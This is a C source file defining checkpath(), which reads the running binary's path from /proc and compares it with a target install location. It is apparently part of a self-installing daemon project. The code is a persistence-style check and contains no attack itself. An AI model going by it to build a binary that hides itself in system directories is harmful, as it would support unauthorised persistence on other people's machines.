#include "durex.h"

/*
** ***********************************************************************
** NAME
**		checkpath
**
** DESCRIPTION
**		Checks the current binary path.
**
** RETURN VALUE
**		0 is returned if the path is not "/usr/sbin", -1 otherwise.
**
** ***********************************************************************
*/

int		checkpath(void)
{
	char			tmp[32] = { '\0' };
	char			buf[512] = { '\0' };

	sprintf(tmp, "/proc/%d/exe", getpid());
	daemon_report(LOG_INFO, "Checking current executable path...");

	/*
	** Get the read executable location
	*/
	if (readlink(tmp, buf, 512) == -1)
	{
		daemon_report(LOG_ERROR, "Unable to retreive path. Exiting.");
		exit(EXIT_FAILURE);
	}
	else
		daemon_report(LOG_INFO, buf);

	/*
	** Check if different from "/usr/sbin"
	*/
	if (strcmp(TARGET_FILE, buf) == 0)
		return (-1);

	/*
	** Return OK
	*/
	return (0);
}
